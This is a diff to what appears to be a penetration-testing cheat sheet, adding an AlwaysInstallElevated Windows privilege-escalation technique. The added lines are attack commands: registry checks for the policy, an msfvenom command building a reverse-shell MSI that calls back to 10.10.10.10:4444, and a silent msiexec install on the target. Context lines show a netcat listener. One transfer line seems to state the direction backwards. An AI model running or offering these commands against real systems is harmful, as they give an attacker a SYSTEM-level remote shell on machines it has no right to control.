@@ -57,3 +57,13 @@ nc -lvnp 4444 # our kali
 ------------------------------
 schtasks /run /tn vulntask # target system
 ```
+# AlwaysInstallElevated ✅
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
+------------------------------
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
+# transfer malicious.msi file to our kali # target system
+------------------------------
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
+```
